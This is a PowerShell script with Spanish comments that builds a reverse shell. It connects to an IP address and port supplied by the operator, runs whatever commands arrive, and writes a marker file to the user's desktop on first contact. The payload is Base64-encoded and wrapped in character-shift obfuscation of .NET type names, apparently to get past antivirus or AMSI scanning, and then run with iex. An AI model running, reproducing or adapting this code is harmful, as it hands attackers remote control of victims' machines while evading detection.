param([string]$ip, [int]$port, [int]$offset=4)
$ErrorActionPreference = "SilentlyContinue"

# Reverse shell
$rev_shell = @'
$x=(New-Object net.sockets.tcpclient("$ip",$port)).getstream();
[byte[]]$b=0..65535 | % {0};

# Bandera para ejecutar comandos automatizados
$executed = $false;

while (($i=$x.read($b,0,$b.Length)) -ne 0) {
    if (-not $executed) {
        try {
            # Crear un archivo en el escritorio
            Add-Content -Path "$env:USERPROFILE\Desktop\prueba.txt" -Value "Este archivo fue creado automáticamente." | Out-Null
        } catch {
            Add-Content -Path "$env:USERPROFILE\Documents\error_log.txt" -Value "Error ejecutando comandos automatizados." | Out-Null
        }
        $executed = $true;
    }

    # Continuar con la interacción de la shell
    $d=([system.text.encoding]::getencoding(20127)).getbytes(
        ((iex ((New-Object -t text.asciiencoding).getstring($b,0,$i)) 2>&1 | out-string) + (pwd).path + "> ")
    );
    $x.write($d,0,$d.Length);
    $x.flush();
}
'@ -replace '\$ip', $ip -replace '\$port', $port

# Convertimos el contenido de $rev_shell a Base64
$b64 = [convert]::ToBase64String([text.encoding]::ASCII.GetBytes($rev_shell))

# Lista de nombres críticos a ofuscar
$strings = @(
    "assembly", 
    "gettype", 
    "System.Text.Encoding", 
    "System.Convert", 
    "ascii", 
    "getstring", 
    "frombase64string", 
    $b64
)

# Función para aplicar ofuscación
$start = "([string]::('n'+'ew')([char[]](('"
$end = "'"+'|fhx).('+"'by'+'tes'"+')|%{$johnxor-'+"$offset})))"
$fix = @'
'+"'"+'
'@

function AplicarOffset {
    param([string]$plaintext)
    (($plaintext -split '' | %{[int][char]$_ + $offset} | %{[char]$_}) -join '') -replace ',', '' -replace "'", $fix -replace "^", $start -replace '$', $end -replace 'johnxor', '_'
}

$strings = $strings | %{AplicarOffset($_)}

# Construir el comando final ofuscado
$final = ' [text.encoding]::('+"'asc'+'ii'"+").('gets'+'tring')([type]."+$strings[0]+'.'+$strings[1]+'('+$strings[3]+')::'+$strings[6]+'('+$strings[7]+'))|iex'

# Ejecutar el código ofuscado
iex $final











